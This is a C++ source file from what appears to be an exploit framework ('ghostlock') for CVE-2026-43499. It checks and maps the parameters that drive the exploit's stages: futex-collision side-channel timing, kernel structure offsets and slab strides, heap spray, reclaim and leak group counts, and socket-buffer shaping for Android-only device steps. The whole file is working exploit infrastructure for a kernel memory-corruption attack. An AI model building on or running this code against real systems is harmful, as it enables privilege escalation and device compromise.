/** @file backend/cve_2026_43499/steps/prepare_mapping.cpp
 *  The mapping itself: zero is "the document did not carry it", never a value. See the header.
 */
#include "backend/cve_2026_43499/steps/prepare_mapping.hpp"

#include <cstdio>
#include <cstring>

namespace ghostlock::backend::cve_2026_43499::steps {
    namespace {
        /** True when this input has a schema key, i.e. the document can supply it. Rows without one
         *  are the table's declared-gap list. */
        bool takes_part(const char *input) noexcept {
            for (std::size_t i = 0U; i < kPrepareInputKeyCount; ++i) {
                if (std::strcmp(kPrepareInputKeys[i].input, input) == 0) {
                    return kPrepareInputKeys[i].wire_key != nullptr;
                }
            }
            return false;
        }
        /** The refusal name for one input, from the table (constants only -- nothing formatted). */
        const char *missing_name(const char *input) noexcept {
            for (std::size_t i = 0U; i < kPrepareInputKeyCount; ++i) {
                if (std::strcmp(kPrepareInputKeys[i].input, input) == 0) { return kPrepareInputKeys[i].refusal; }
            }
            return "prepare-value-missing:unknown";
        }
    }  // namespace
    bool map_prepare_inputs(const PrepareValues &values, PrepareMapped &out,
                            const char **refusal) noexcept {
        struct Item final {
            const char *input;
            const char *refusal;
            std::uint64_t value;
        };
        const Item items[] = {
            {"snitch_collisions", "prepare-value-missing:snitch_collisions", values.snitch_collisions},
            {"snitch_threads", "prepare-value-missing:snitch_threads", values.snitch_threads},
            {"futex_table_size", "prepare-value-missing:futex_table_size", values.futex_table_size},
            {"mm_struct_sz", "prepare-value-missing:mm_struct_sz", values.mm_struct_sz},
            {"region_threads", "prepare-value-missing:region_threads", values.region_threads},
            {"snitch_round_wait_us", "prepare-value-missing:snitch_round_wait_us", values.snitch_round_wait_us},
            {"snitch_wake_rounds", "prepare-value-missing:snitch_wake_rounds", values.snitch_wake_rounds},
            {"prepare_max_attempts", "prepare-value-missing:prepare_max_attempts", values.prepare_max_attempts},
            {"prepare_timeout_ms", "prepare-value-missing:prepare_timeout_ms", values.prepare_timeout_ms},
            {"kernelsnitch_timeout_ms", "prepare-value-missing:kernelsnitch_timeout_ms", values.kernelsnitch_timeout_ms},
            {"setup_settle_us", "prepare-value-missing:setup_settle_us", values.setup_settle_us},
            {"state_poll_interval_us", "prepare-value-missing:state_poll_interval_us", values.state_poll_interval_us},
            {"route_wait_ms", "prepare-value-missing:route_wait_ms", values.route_wait_ms},
            {"route_done_timeout_ms", "prepare-value-missing:route_done_timeout_ms", values.route_done_timeout_ms},
            {"waiter_offset", "prepare-value-missing:waiter_offset", values.waiter_offset},
            {"task_offset", "prepare-value-missing:task_offset", values.task_offset},
            {"lock_offset", "prepare-value-missing:lock_offset", values.lock_offset},
            {"buffer_size", "prepare-value-missing:buffer_size", values.buffer_size},
            {"word_bytes", "prepare-value-missing:word_bytes", values.word_bytes},
            {"handle_bytes", "prepare-value-missing:handle_bytes", values.handle_bytes},
            {"coarse_stride", "prepare-value-missing:coarse_stride", values.coarse_stride},
            {"slab_stride", "prepare-value-missing:slab_stride", values.slab_stride},
            {"mm_objs_per_slab", "prepare-value-missing:mm_objs_per_slab", values.mm_objs_per_slab},
            {"shaped", "prepare-value-missing:shaped", values.shaped},
            {"socket_buffer", "prepare-value-missing:socket_buffer", values.socket_buffer},
            {"send_size", "prepare-value-missing:send_size", values.send_size},
            {"header_bytes", "prepare-value-missing:header_bytes", values.header_bytes},
            {"total_pokes", "prepare-value-missing:total_pokes", values.total_pokes},
            {"page_size", "prepare-value-missing:page_size", values.page_size},
            {"region_size", "prepare-value-missing:region_size", values.region_size},
            {"object_size", "prepare-value-missing:object_size", values.object_size},
            {"pre_groups", "prepare-value-missing:pre_groups", values.pre_groups},
            {"spray_groups", "prepare-value-missing:spray_groups", values.spray_groups},
            {"post_groups", "prepare-value-missing:post_groups", values.post_groups},
            {"leak_groups", "prepare-value-missing:leak_groups", values.leak_groups},
        };
        for (const Item &item : items) {
            /* Rows whose schema key does not exist yet are the table@Q@s "declared gap" list: they
             *  do not take part in the mapping (there is nothing to read), and the step that needs
             *  one refuses by name when it gets there (prepare-key-undeclared:<input>). */
            if (!takes_part(item.input)) { continue; }
            if (item.value == 0U) {
                *refusal = item.refusal;
                return false;
            }
        }
        out.snitch.collisions = values.snitch_collisions;
        out.snitch.thread_count = values.snitch_threads;
        out.snitch.futex_table_size = static_cast<std::uint32_t>(values.futex_table_size);
        out.geometry.waiter_offset = static_cast<std::size_t>(values.waiter_offset);
        out.geometry.task_offset = static_cast<std::size_t>(values.task_offset);
        out.geometry.lock_offset = static_cast<std::size_t>(values.lock_offset);
        out.geometry.buffer_size = static_cast<std::size_t>(values.buffer_size);
        out.prepare_max_attempts = values.prepare_max_attempts;
        out.prepare_timeout_ms = values.prepare_timeout_ms;
        out.route_wait_ms = values.route_wait_ms;
        out.route_done_timeout_ms = values.route_done_timeout_ms;
        out.setup_settle_us = values.setup_settle_us;
        out.state_poll_interval_us = values.state_poll_interval_us;
        return true;
    }
    bool map_region_inputs(const PrepareValues &values, RegionMapped &out, const char **refusal) noexcept {
        const struct { const char *input; std::uint64_t value; } needed[] = {
            {"page_size", values.page_size}, {"header_bytes", values.header_bytes},
            {"region_size", values.region_size}, {"object_size", values.object_size},
            {"total_pokes", values.total_pokes}, {"word_bytes", values.word_bytes},
            {"handle_bytes", values.handle_bytes}, {"snitch_wake_rounds", values.snitch_wake_rounds},
            {"snitch_round_wait_us", values.snitch_round_wait_us},
            {"snitch_collisions", values.snitch_collisions},
            {"snitch_threads", values.snitch_threads},
            {"region_threads", values.region_threads},
            {"futex_table_size", values.futex_table_size},
            {"mm_struct_sz", values.mm_struct_sz},
        };
        for (const auto &row : needed) {
            if (row.value == 0U) { *refusal = missing_name(row.input); return false; }
        }
        out.inputs.header_bytes = static_cast<std::size_t>(values.header_bytes);
        out.inputs.collisions = static_cast<std::size_t>(values.snitch_collisions);
        /* region 的线程数与 setup 的不是同一个量：验证那轮分别是 4 与 1。 */
        out.inputs.thread_count = static_cast<std::size_t>(values.region_threads);
        out.inputs.total_pokes = static_cast<std::size_t>(values.total_pokes);
        out.inputs.page_size = static_cast<std::size_t>(values.page_size);
        out.inputs.word_bytes = static_cast<std::size_t>(values.word_bytes);
        out.inputs.handle_bytes = static_cast<std::size_t>(values.handle_bytes);
        out.patience.wake_rounds = static_cast<std::uint32_t>(values.snitch_wake_rounds);
        out.patience.round_timeout_us = static_cast<std::int64_t>(values.snitch_round_wait_us);
        out.strides.coarse = values.coarse_stride;
        out.strides.slab = values.slab_stride;
        /* candidate 步长是 mm_struct_sz（退役走查就是这么走的），与 region 的 object_size 不同。 */
        out.strides.candidate = values.mm_struct_sz;
        /* 判据用单元自己的那一个，不在这里重写公式。 */
        if (!leak::strides_are_usable(out.strides)) { *refusal = "prepare-strides-unusable"; return false; }
        return true;
    }
    bool map_reclaim_inputs(const PrepareValues &values, ReclaimMapped &out, const char **refusal) noexcept {
        const struct { const char *input; std::uint64_t value; } needed[] = {
            {"pre_groups", values.pre_groups},
            {"post_groups", values.post_groups},
            {"spray_groups", values.spray_groups}, {"mm_objs_per_slab", values.mm_objs_per_slab},
            {"socket_buffer", values.socket_buffer}, {"send_size", values.send_size},
        };
        for (const auto &row : needed) {
            if (row.value == 0U) { *refusal = missing_name(row.input); return false; }
        }
        out.counts.pre = static_cast<std::size_t>(values.pre_groups);
        out.counts.post = static_cast<std::size_t>(values.post_groups);
        out.counts.spray = static_cast<std::size_t>(values.spray_groups);
        out.counts.mm_objs_per_slab = static_cast<std::size_t>(values.mm_objs_per_slab);
        out.counts.shaped = values.shaped != 0U;
        out.shaping.socket_buffer = static_cast<std::int32_t>(values.socket_buffer);
        out.shaping.send_size = static_cast<std::size_t>(values.send_size);
        /* 建计划与判判决归设备侧的步骤（那些单元是 Android-only，主机链不上）：本层只把输入
         *  填对，判据仍由单元自己的 verdict 说了算。 */
        return true;
    }
    bool map_all_prepare(const PrepareValues &values, AllMapped &out, const char **refusal) noexcept {
        if (!map_prepare_inputs(values, out.base, refusal)) { return false; }
        if (!map_region_inputs(values, out.region, refusal)) { return false; }
        if (!map_reclaim_inputs(values, out.reclaim, refusal)) { return false; }
        return true;
    }
}  // namespace ghostlock::backend::cve_2026_43499::steps
